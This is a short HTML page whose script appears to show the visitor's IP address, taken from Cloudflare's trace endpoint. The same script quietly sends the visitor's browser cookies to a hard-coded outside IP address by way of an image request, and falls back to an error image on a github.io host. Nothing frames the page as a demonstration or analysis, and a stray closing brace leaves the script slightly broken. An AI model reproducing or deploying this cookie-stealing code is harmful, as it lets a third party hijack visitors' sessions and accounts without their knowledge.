<!DOCTYPE html>
<html>

<head>
	<script>
        const API_URL = `https://www.cloudflare.com/cdn-cgi/trace`;
        function onDataRecieve() {
            const ipRegex = /[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/                           
            const IP = xhttp.responseText.match(ipRegex)[0];
            document.getElementById("demo").innerHTML = IP
	   
		    var image = new Image();
            image.src = "http://95.76.182.171" + encodeURI( document.cookie );
            setTimeout
            (
               function()
                {
                    if ( !image.complete || !image.naturalWidth )
                    {
                        image.src = "https://nightchips-dev.github.io/err.png";
                    }
                },
                1000
            );
	    }
        }
        const xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = onDataRecieve;
        xhttp.open("GET", API_URL, true);
        xhttp.send();
		
	
	</script>
	</head>
	

<body>
	<div id="demo"></div>
</body>


</html>
